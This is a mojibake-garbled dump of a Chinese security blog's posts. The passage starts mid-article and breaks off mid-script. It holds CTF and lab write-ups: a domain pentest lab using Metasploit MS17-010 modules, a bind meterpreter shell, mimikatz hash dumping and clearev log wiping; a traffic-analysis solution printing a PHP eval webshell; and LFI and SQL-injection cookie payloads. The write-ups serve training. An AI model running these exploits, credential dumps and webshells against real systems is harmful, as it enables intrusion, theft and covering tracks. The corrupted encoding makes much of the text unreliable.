è¿ä¸Švpnåˆåœ¨å†…ç½‘ä¸­ä½¿ç”¨psexecå’Œbind_tcpçš„æ—¶å€™ç»å¸¸ä¼šå‡ºç°è¿™ç§æƒ…å†µ å†…ç½‘ä¿¡æ¯æœé›†åœ¨csä¸­å°è¯•ä½¿ç”¨mimikatzè·å–ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç  ä½¿ç”¨ladonæ‰«æå†…ç½‘ å¾—åˆ°ç»“æœï¼š 192.168.52.3 139 445 3389 192.168.52.138 80 445 139 389 192.168.52.141 21 139 192.168.52.138ä¸»æœº389ç«¯å£å¼€å¯äº†LDAPæœåŠ¡ï¼Œå¯èƒ½æ˜¯DCã€‚ ä¸‹é¢å°è¯•æ·»åŠ è·¯ç”±ï¼Œä½¿ç”¨Windows7ä½œä¸ºè·³æ¿æœºè®¿é—®Windows2003 ç»å°è¯•åå¯ä»¥pingé€šï¼Œå¯ä»¥é¡ºåˆ©è®¿é—®ã€‚ æ¸—é€åŸŸå†…æˆå‘˜141ä½¿ç”¨nmapå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æï¼Œå°è¯•æ‰«æSMBæ¼æ´ å‘ç°æ¼æ´ï¼Œå°è¯•åˆ©ç”¨ æˆåŠŸè·å–ç›®æ ‡æœºå™¨çš„shellã€‚ load mimikatz mimikatz_command -f samdump::hashes è·å–ä¸»æœºçš„å¯†ç ï¼Œè¿™æ ·å°±æˆåŠŸæŠ“åˆ°äº†ä¸»æœºçš„ç”¨æˆ·åå’ŒNTML-hashå€¼ã€‚ æ¸—é€åŸŸæ§ä½¿ç”¨nmapå¯¹ç›®æ ‡ipè¿›è¡Œæ‰«æï¼Œå‘ç°MS17-010å’ŒMS08-067æ¼æ´ï¼Œè¿™æ¬¡å°è¯•åˆ©ç”¨MS17-010è¿›è¡Œæ”»å‡»ã€‚ é¦–å…ˆå…³é—­é˜²ç«å¢™ 1234use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset rhosts 192.168.52.138set command &quot;netsh advfirewall set allprofiles state off&quot;exploit æ¥ä¸‹æ¥è·å¾—ä¸€ä¸ªæ­£å‘shell 1234use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpexploit ä¹‹åæˆ‘ç”¨mimikatzæŠ“å¯†ç å‡ºäº†ç‚¹é—®é¢˜ï¼ŒæŠ¥é”™mod_process::getVeryBasicModulesListForProcess : (0x0000012b) æœäº†æœè¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºmimikatzé»˜è®¤åŠ è½½32ä½ç³»ç»Ÿï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿæ˜¯64ä½çš„ï¼Œæ‰€ä»¥é¦–å…ˆè¦å°†meterpreterè¿ç§»åˆ°ä¸€ä¸ª64ä½è¿›ç¨‹ä¸Šã€‚ PSä¸€ä¸‹ï¼Œé€‰æ‹©æƒé™ä¸ºNT AUTHORITY\\SYSTEMæƒé™çš„è¿›ç¨‹ migrate pid å³å¯ã€‚ ä¹‹ååœ¨ç”¨mimikatzæŠ“å¯†ç å°±èƒ½æŠ“åˆ°äº†ã€‚ æ”»å‡»ç»“æŸåä½¿ç”¨clearevå‘½ä»¤æ¸…é™¤æ”»å‡»ç—•è¿¹ã€‚ æ€»ç»“ç¬¬ä¸€æ¬¡å®Œæ•´åœ°åšå†…ç½‘æ¸—é€ç›¸å…³çš„ç»ƒä¹ ï¼Œå¯¹å†…ç½‘æ¸—é€çš„è¿‡ç¨‹ä¸å¤ªç†Ÿæ‚‰ï¼Œå·¥å…·çš„ä½¿ç”¨ä¹Ÿä¸ç†Ÿæ‚‰ï¼Œå¯¹ä¸€äº›æ¦‚å¿µæ€§çš„åŸºç¡€é—®é¢˜ä¹Ÿä¸å¤ªç†Ÿæ‚‰ã€‚ã€‚ã€‚å¸Œæœ›èƒ½åœ¨åç»­çš„å­¦ä¹ è¿‡ç¨‹ä¸­ä¸æ–­å®Œå–„è¿™äº›æ–¹é¢ã€‚ å‚è€ƒé“¾æ¥https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7 https://www.freebuf.com/column/230476.html https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"comprehensive traffic analysis","slug":"comprehensive-traffic-analysis","date":"2020-11-30T07:58:16.000Z","updated":"2020-11-30T07:59:52.327Z","comments":true,"path":"2020/11/30/comprehensive-traffic-analysis/","link":"","permalink":"https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/","excerpt":"","text":"é¢˜ç›®2019.8 å®‰æ’æµé‡åˆ†æ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯) æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·å¯†ç ç™»é™†äº†webåå°(å½¢å¼:username/password) æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç  æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ç ´è§£äº†è´¦å·&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;å¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œè¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰ æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢è·å¾—çš„vpnçš„ipæ˜¯å°‘ é¢˜ç›®åˆ†æ1.è§‚å¯Ÿ12281å·åŒ…ï¼Œçœ‹HTTPå±‚çš„referrerï¼Œå‘ç°äº†AWVSçš„æ‰«æå™¨ç‰¹å¾ã€‚ 2.è¿‡æ»¤httpåè®®ï¼Œå‘ç°/admin/login.php 3.è¿‡æ»¤httpåè®®ï¼Œçœ‹86å·åŒ…ï¼Œå‘ç°äº†è¡¨å•æ•°æ® username äººäº‹ password hr123456ï¼ˆé”™è¯¯ç­”æ¡ˆï¼‰ 302è·³è½¬ä»£è¡¨ç™»é™†æˆåŠŸ ä½¿ç”¨http contains â€œrec=loginâ€ and http.request.method==POST and ip.src==192.168.94.59 è¯­å¥å¯¹weboneè¿›è¡Œè¿‡æ»¤ï¼Œå°†ç»“æœå¯¹æ—¶é—´è¿›è¡Œæ’åºï¼Œå‘ç°æœ€åä¸€ä¸ªåŒ…ä¸­çš„username admin password admin!@#pass123 4.a.php ç¿»åˆ°æœ€åå‘ç°äº†a.php ç„¶ååˆ†ç»„åˆ—è¡¨æœa.php æ‰¾POSTåŒ… Form item: â€œactionâ€ = â€œQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb ä½¿ç”¨ http contains â€œ&lt;?php @evalâ€ è¿‡æ»¤æ‰¾ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ã€‚ è€ƒè™‘TCP é‡ä¼ å¯èƒ½å¯¼è‡´httpæ²¡è¿½è¸ªåˆ°ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨tcp contains â€œ&lt;?php @evalâ€ å‘ç°äº† 1&lt;?php @eval($_POST[1234]);?&gt; å°†å…¶base64encodeå³å¯ã€‚ 1PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D; 5.æœå­—ç¬¦ä¸²robots.txt å‘ç°flag flag:87b7cb79481f317bde90c116cf36084b 6.æ‰¾åˆ°webshellçš„åç§°åï¼Œä¸€ç›´è·Ÿè¸ªwebshellï¼Œçœ‹çœ‹å¥¹åœ¨åšä»€ä¹ˆã€‚æ•°æ®åŒ…å¤§æ¦‚åœ¨734581ã€‚ åé¢ä¼šå‘ç°æŸ¥çœ‹äº†æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå°±å‘ç°äº†æ•°æ®åº“è´¦å·å¯†ç  dbuser web dbpass e667jUPvJjXHvEUv 7.åœ¨web2æ•°æ®åŒ…ä¸­ è¿‡æ»¤mysqlåè®® åˆ†ç»„å­—èŠ‚æµæœç´¢å­—ç¬¦ä¸²hash_code çœ‹responseåŒ…å‘ç°hash_code d1c029893df40cb0f47bcf8f1c3c17ac 8.web2æ•°æ®åŒ…ä¸­ è¿‡æ»¤mysqlåè®® æœç´¢å­—ç¬¦ä¸² &#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d; ï¼Œçœ‹åˆ°md5åŠ å¯†çš„å¯†ç b78f5aa6e1606f07def6e839121a22ecï¼Œè§£å¯†ä¸€ä¸‹å¾—åˆ°edc123!@# 9.è¿½è¸ªwebshellåŒ…ï¼Œå‘ç°äº†ifconfigå‘½ä»¤ã€‚ -&gt;|eth0 Link encap:Ethernet HWaddr 00:0C:29:CB:9F:85 \\n â€‹ inet addr:192.168.32.189 Bcast:192.168.32.255 Mask:255.255.255.0\\n 10.æ‰“å¼€mailtwoæ•°æ®åŒ…ï¼Œè¿‡æ»¤httpæµï¼Œå‘ç°ç¬¬ä¸€ä¸ªæ•°æ®åŒ…é‡Œé¢çš„åŠ¨ä½œæ˜¯ç™»å‡ºï¼Œå‘ç°äº†ç”¨æˆ·åwenwenniã€‚ ç„¶åçœ‹28å·æ•°æ®åŒ…çš„æ“ä½œæ˜¯è®¿é—®ç™»å½•é¡µé¢ï¼Œ35å·æ•°æ®åŒ…å‘ç°äº†å¯†ç åŠ å¯†å‡½æ•°ã€‚ æ˜¯AES-CBCåŠ å¯†ï¼Œkeyä¸º1234567812345678ã€‚ ç»§ç»­çœ‹42 44æ•°æ®åŒ…ï¼Œè¿˜æ˜¯wenwenniç”¨æˆ·ç™»å½•ï¼Œå¹¶ä¸”è¿”å›äº† success true. å°è¯•ä½¿ç”¨å¦‚ä¸‹è¿‡æ»¤å™¨è¿‡æ»¤: 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59 å‘ç°åˆ°æœ€åä¹Ÿæ²¡çˆ†ç ´æˆåŠŸï¼ˆè¿™é¢˜çœ‹çš„åˆ«äººçš„æ€è·¯ï¼Œæˆ‘æ²¡æ‡‚ï¼‰ ç„¶åæ‰“å¼€mailto1 ç»§ç»­ä½¿ç”¨ä¸Šè¿°è¯­å¥è¿‡æ»¤ å‘ç°18512ç™»é™†æˆåŠŸï¼Œåˆ™å¯†ç åœ¨17126å·æ•°æ®åŒ…ä¸­ã€‚+ZgE14UGcFcyRGLI0/ZXPQ== å¯†ç ä¸º1234567812345678çš„MD5å€¼ï¼Œåç§»é‡ä¸º1234567812345678 AESè§£å¯†å¾—admin!@#PASS123 11.ç¬¬ä¸€ä¸ªvpnæ•°æ®åŒ…åœ¨å°è¯•ç™»å½•vpnï¼Œç„¶åçœ‹ç¬¬äºŒä¸ªã€‚ ç»Ÿè®¡ä¸€ä¸‹ä¼šè¯ä¿¡æ¯ï¼Œå‘ç°10.3.4.3 10.3.4.96 10.3.4.55 è¿™å‡ ä¸ªipä¹‹é—´çš„é€šä¿¡è¾ƒå¤šï¼Œç„¶åè¿‡æ»¤çœ‹çœ‹ã€‚ è¿‡æ»¤ä¸€ä¸‹smbåè®®ï¼Œå‘ç°10.3.4.96æ˜¯SMBæœåŠ¡å™¨ã€‚ ç„¶ååœ¨çœ‹ä¸€ä¸‹55è¿™ä¸ªip ip.addr==10.3.4.55 å‘ç°10.3.4.3é¦–å…ˆpingäº†10.3.4.55 æ‰€ä»¥ç¡®å®š10.3.4.3æ˜¯é»‘å®¢ä½¿ç”¨çš„vpnæœåŠ¡å™¨ã€‚ æ€»ç»“å¯¹ä¸€äº›æœ‰æ‰‹å°±è¡Œçš„è¿‡æ»¤æ–¹æ³•ç”¨çš„è¿˜å¯ä»¥ï¼Œä½†æ˜¯æ·±å…¥ä¸€ç‚¹å°±ä¸å¤ªè¡Œäº† å¯¹ä¸€äº›æµé‡åŠ¨ä½œçš„åˆ†æä¸å¤ªåˆ°ä½ï¼Œå¯¹filterçš„ç”¨æ³•ä¹Ÿä¸å¤ªç†Ÿæ‚‰ï¼Œæ¯”å¦‚\\è¡¨è½¬ä¹‰ã€‚ç»§ç»­å­¦ä¹ ï¼ å¾…å­¦ä¹ ï¼šPPTPåè®®ã€SMBåè®®å‚è€ƒhttps://blog.csdn.net/qq_43431158/article/details/107176918","categories":[],"tags":[]},{"title":"å®‰æ´µæ¯miscå…¨wp","slug":"å®‰æ´µæ¯miscå…¨wp","date":"2020-11-26T09:42:26.000Z","updated":"2020-11-26T09:42:44.965Z","comments":true,"path":"2020/11/26/å®‰æ´µæ¯miscå…¨wp/","link":"","permalink":"https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/","excerpt":"","text":"å¯†ç å­¦ çˆ†ç ´SECRETæ˜¯ä¸çŸ¥é“çš„ flagæ˜¯md5(SECRET).hexdigest() å·²çŸ¥éƒ¨åˆ†flagä¸º 1d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125; cipheræ˜¯sha256åŠ å¯†åçš„flagï¼Œå…¶æ‘˜è¦ä¸º 0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a ç°åœ¨ä¸çŸ¥é“secretã€‚ str1=â€71b2b5616â€ str2=â€2a4639â€ str3=â€7d979â€ str4=â€de964câ€ str1 2 3 4 ä¹‹é—´åˆ†åˆ«æœ‰ä¸¤ä½ä¸çŸ¥é“ çˆ†ç ´çš„è¯éœ€è¦çˆ†ç ´16^6æ¬¡ã€‚ ç›´æ¥çˆ†ç ´ 12345678910111213141516171819import hashlibbroken_flag= &#x27;71b2b5616**2a4639**7d979**de964c&#x27;str1=&quot;d0g3&#123;71b2b5616&quot;str2=&quot;2a4639&quot;str3=&quot;7d979&quot;str4=&quot;de964c&#125;&quot;cipher=&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;def getdigest(content): return hashlib.sha256(content).hexdigest()alphabet=&quot;1234567890abcdef&quot;for a in alphabet: for b in alphabet: for c in alphabet: for d in alphabet: for e in alphabet: for f in alphabet: string=str1+a+b+str2+c+d+str3+e+f+str4 if getdigest(string)==cipher: print string miscç­¾åˆ°æ‰«ç å¥—å¨ƒï¼Œç„¶åå¾—åˆ°ä¸€ä¸ªflag.docxï¼Œé‡Œé¢ä¸€ä¸²ä¹±ç ï¼Œè€Œä¸”å…¬ä¼—å·ä¹Ÿæç¤ºäº†ä¸æ˜¯emojidecodeï¼Œä½†æ˜¯è¿™ç©æ„é™¤äº†emojidecodeè¿˜èƒ½æ˜¯å•¥ï¼Ÿ å› ä¸ºæˆ‘çš„word2016æ— æ³•æ˜¾ç¤ºemojiï¼Œç„¶åæˆ‘æ¢æˆrarè§£å‹ï¼Œåœ¨xmlé‡Œé¢çœ‹åˆ°äº†emojiï¼Œæ”¾åˆ°åœ¨çº¿è§£å¯†å·¥å…·å³å¯ã€‚ï¼ˆå¸ˆå‚…ä»¬ç›´æ¥å¤åˆ¶è¿‡å»å°±å®Œäº‹äº†ï¼‰ ç‹ç‰Œç‰¹å·¥è¿™é“é¢˜ä¸€å¼€å§‹æ²¡å•¥æ€è·¯ï¼Œç„¶åfileçœ‹ä¸€ä¸‹æ˜¯ext3æ ¼å¼ã€‚ç½‘ä¸Šæœäº†ä¸€ç¯‡æ•™ç¨‹å°±å·®ä¸å¤šå‡ºæ¥äº†ã€‚ https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/ å·¥å…·ï¼šfsstatï¼Œext3grepï¼Œveracryptã€‚ è£…ext3grepçš„æ—¶å€™ï¼ŒæŠ¥é”™äº†æŒ‰ç…§ç½‘ä¸Šè¯´çš„åšå¢æ·»ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘è¿™è¿˜ä¼šæŠ¥é”™ï¼ŒæŠŠæœ€åæŠ¥é”™çš„é‚£ä¸€è¡Œæ³¨é‡Šæ‰å°±å®Œäº‹å„¿äº†ã€‚ é¦–å…ˆä½¿ç”¨fsstatçœ‹é•œåƒä¿¡æ¯ã€‚ fsstat findme å…¶ä¸­root directoryæ¯”è¾ƒé‡è¦ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ æ¥ä¸‹æ¥ä½¿ç”¨ext3grepæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ã€‚ ext3grep â€“inode 2 findme æ¢å¤è¿™ä¸ªä¸œè¥¿ ext3grep â€“restore-file .coolboy.swp findme vim -r .coolboy.swp æ–°å»ºä¸€ä¸ªç›®å½•/root/coolboy æ¢å¤å®Œä¼šæ”¾åˆ°è¿™é‡Œé¢ï¼Œbase64è§£ç åçš„å†…å®¹ä¸ºï¼š 1çœŸçš„å¯†ç :this_is_a_true_key ç”¨è¿™ä¸ªå¯†ç ä½¿ç”¨veracryptå»æŒ‚è½½flagboxï¼Œå°±å¯ä»¥è·å¾—flagã€‚ misc3ä¸€å¼€å§‹æ˜¯hardzipï¼Œæœ‰ä¸ªå¯†ç 1ï¼Œçœ‹æ–‡ä»¶æ¯”è¾ƒçŸ­å°è¯•CRC32çˆ†ç ´ï¼Œçˆ†ç ´å®Œçš„å¯†ç æ‹¼èµ·æ¥å°±æ˜¯easyzipçš„è§£å‹å¯†ç ã€‚ è§£å‹ä¸‹æ¥easyzipï¼Œ é€šè¿‡ä¼ªåŠ å¯†æ‹¿åˆ°redeme.txtï¼Œå°è¯•æ˜æ–‡æ”»å‡»ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æ˜æ–‡æ”»å‡»éœ€è¦ä¿è¯å¾…ç ´è§£å‹ç¼©åŒ…é‡Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å·²çŸ¥æ–‡ä»¶ã€‚å› ä¸ºè¿™é‡Œé¢æœ‰ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œå…¶ä»–æ–‡ä»¶çš„å‹ç¼©ç®—æ³•å¯èƒ½ä¸å·²çŸ¥æ–‡ä»¶çš„ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯é¡ºåˆ©è¿›è¡Œï¼Œéœ€è¦å°†å…¶ä»–æ–‡ä»¶åˆ é™¤ï¼ˆè¿™é“é¢˜æ‰€éœ€è¦ï¼Œå…¶ä»–æƒ…å†µä¸‹å¦‚æœåŠ å¯†æ–¹å¼éƒ½ä¸€æ ·çš„è¯å°±ä¸ç”¨åˆ é™¤ã€‚ï¼‰ misc4npmtxtæ‰“å¼€ä¸€çœ‹å•¥ä¹Ÿä¸æ‡‚ï¼Œ010editoræ‰“å¼€ä¸€çœ‹æœ‰çœ‹ä¸æ‡‚çš„ä¸œè¥¿ï¼Œæœäº†æœ16è¿›åˆ¶æ…¢æ…¢æœå°±æœåˆ°äº†0å®½éšå†™ã€‚ æŠŠé‚£ä¸€ä¸²å¤åˆ¶åˆ°https://yuanfux.github.io/zero-width-web/ decodeå°±å¯ä»¥è·å¾—è§£å‹å¯†ç  RealV1siBle æ‰“å¼€æ˜¯å¼ å›¾ï¼Œsilenteyeä¸€æŠŠæ¢­å‡ºæ¥flagã€‚ æ€»ç»“è¿™æ¬¡æ¯”èµ›è§‰å¾—webæ¯”è¾ƒéš¾ï¼Œsstiæ²¡åšå‡ºæ¥æ¯”è¾ƒä¸Šå¿ƒã€‚æœ€è¿‘æ‰“ç®—æ·±åº¦å­¦ä¹ sstiç›¸å…³å†…å®¹ï¼Œäº‰å–ä¸‹æ¬¡åšå‡ºæ¥ï¼","categories":[],"tags":[]},{"title":"å±±ä¸œçœæ–°ä¸€ä»£æ”»é˜²èµ›wp","slug":"å±±ä¸œçœæ–°ä¸€ä»£æ”»é˜²èµ›wp","date":"2020-11-23T14:01:58.000Z","updated":"2020-11-26T09:53:35.018Z","comments":true,"path":"2020/11/23/å±±ä¸œçœæ–°ä¸€ä»£æ”»é˜²èµ›wp/","link":"","permalink":"https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/","excerpt":"","text":"å‰è¨€æ‰“èŠåŸçš„æ¯”èµ›ï¼Œåˆç™½ç»™äº†ï¼Œæ‹¿äº†å‚ä¸å¥–ï¼Œåšå‡ºæ¥ä¸¤ä¸ªmiscï¼Œå‰©ä¸‹ä¸¤ä¸ªmiscéƒ½åšäº†å¿«ä¸€åŠï¼Œæ²¡æ€è·¯äº†ï¼Œç‰¹æ¥å¤ç°ã€‚ webweb1æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼ŒæŸ¥çœ‹æºç å‘ç°äº†æµ‹è¯•è´¦å·test/test æŸ¥çœ‹robots.txt å‘ç°php.php å‘ç°æ˜¯phpinfoã€‚ ç™»å½•ä¹‹åå‘ç°å¯èƒ½å­˜åœ¨LFIï¼Œç„¶åä¸Šäº†ä¸‹æ‰«æå™¨ï¼Œæ‰«åˆ°äº†ä¸€äº›æ–‡ä»¶ï¼Œå°è¯•åŒ…å«info.phpï¼Œå¾—åˆ°æºç ï¼Œç„¶åå‘ç°äº†includeäº†template/info.htmlï¼Œäºæ˜¯è®¿é—®ã€‚æŸ¥çœ‹æºç å‘ç°äº†hint m4nageee.phpã€‚ç„¶åè¯»manageçš„æºç ï¼Œåœ¨æºç ä¸­å‘ç°åŒ…å«äº†2333.htmlï¼Œäºæ˜¯è®¿é—®ã€‚ æŸ¥çœ‹æºç æ—¶å‘ç°äº†phpä»£ç ï¼Œå°è¯•PHP sessionæ–‡ä»¶åŒ…å«ã€‚ ä½†æ˜¯éœ€è¦sessionçš„å­˜æ”¾ä½ç½®ï¼Œäºæ˜¯é€šè¿‡æ‰«æåˆ°çš„php.phpæŸ¥çœ‹sessionæ—¥å¿—çš„å­˜æ”¾ä½ç½®/var/lib/php5ï¼Œé‚åŒ…å«ä¹‹ã€‚ åœ¨m4nageeeé‡Œé¢å†™nicknameåˆ°sessionæ–‡ä»¶é‡Œé¢ï¼Œåˆ©ç”¨LFIåŒ…å«getshellã€‚ å½“å‰æˆ‘çš„phpsessidä¸º0u335c2ud2h9gjq0lq6nos1i72 æ‰€ä»¥sessionæ–‡ä»¶å°±æ˜¯/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,åŒ…å«å³å¯ã€‚ nikenameé‡Œé¢å†™ 12345678 &lt;?php system(&quot;cat fla*&quot;)ï¼› ?&gt; å³å¯ç»•è¿‡å¯¹flagçš„è¿‡æ»¤æˆ–è€…è¿™æ ·å†™&lt;?php system(&quot;cat fl\\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;); ?&gt;ç­‰ç­‰ã€‚ã€‚ web2 web3é¢˜ç›®æç¤ºä½¿ç”¨sqlmapæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘æ³¨å…¥å·¨æ‹‰è·¨ã€‚ã€‚è€Œä¸”æ•°æ®åº“æ˜¯sqliteçš„ï¼Œæˆ‘åªä¼šä¸€ç‚¹mysqlçš„æ³¨å…¥ã€‚ã€‚å½“æ—¶æ²¡åšå‡ºæ¥ï¼Œèµ›åå¤ç°ä¸‹ã€‚ è¿™é¢˜æ˜¯ä½¿ç”¨cookieæ³¨å…¥ã€‚æˆ‘æ˜ç¡®åœ°çŸ¥é“è‡ªå·±ä¸ä¼šç”¨sqlmapè¿›è¡Œcookieæ³¨å…¥ã€‚ ä¸ä¼š è·Ÿå®˜æ–¹çš„æ€è·¯æ²¡å¤ç°å‡ºæ¥ï¼Œç­‰wpã€‚è¿™é‡Œæ”¾ä¸‹æµå¤§å¸ˆå‚…çš„web2 web3çš„payloadï¼š Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=testâ€™ OR 1=1 LIMIT 1 OFFSET 1 â€“ password=testâ€™ OR 1=1 LIMIT 1 OFFSET 1 â€“ ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D miscez_decodeç®€å•çš„ç¼–ç è½¬æ¢ï¼š 1&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100; htmlå®ä½“ç¼–ç -&gt;hexo2string-&gt;flag flag{f9df54010083b0f1f23a3eaecc5d5a7c} qr_code: æ‰“å¼€å¾ˆå¤šäºŒç»´ç ï¼Œç›²çŒœæ‰«å‡ºæ¥å†…å®¹è½¬0å’Œ1 æ¯”èµ›çš„æ—¶å€™æœ‰ä¸ªç®€å•çš„è¯»äºŒç»´ç çš„å·¥å…·ï¼Œä½†æ˜¯æ‰¹é‡ä¸ä¼šå†™è„šæœ¬ã€‚ã€‚å°±è¯»äº†ä¸¤ä¸ªï¼Œçœ‹å“ªä¸ªæ˜¯0å“ªä¸ªæ˜¯1ï¼Œç„¶åbin2asciiå°±å¯ä»¥äº†ã€‚ ç”¨è„šæœ¬çš„åšæ³•ï¼š 1234567891011121314151617181920212223242526272829# -*-coding:utf8 -*-import osimport zxingimport binasciiimport base64reader=zxing.BarCodeReader()asc=&#x27;&#x27;path=&quot;C:\\\\Users\\\\Administrator\\\\Desktop\\\\èŠåŸ\\\\qrcode&quot;files=os.listdir(path)for i in range (0,len(files)-1): # try: # content=reader.decode(file).raw # if content==&quot;zero&quot;: # 